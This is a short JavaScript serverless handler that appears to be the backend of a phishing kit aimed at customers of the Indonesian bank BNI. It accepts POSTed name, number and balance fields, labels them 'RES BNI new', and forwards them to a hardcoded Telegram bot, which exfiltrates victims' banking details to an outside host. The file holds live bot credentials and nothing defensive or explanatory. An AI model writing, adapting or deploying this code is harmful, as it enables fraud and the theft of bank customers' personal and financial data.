export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const telegramId = '7785695206:AAHDvRmyKRqcwx-3hfhBMjvnxqa47vl1rdg';
    const botToken = '7869205757';

    const { a, b, c } = req.body;

    const message = `
______________________________
RES BNI new
______________________________
¡H NAME : ${a}
¡H NOMOR : ${b}
¡H SALDO : ${c}
______________________________`;

    const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        await fetch(telegramApi, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // Balikin status sukses ke frontend
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ success: false, message: 'Failed to send message' });
    }
}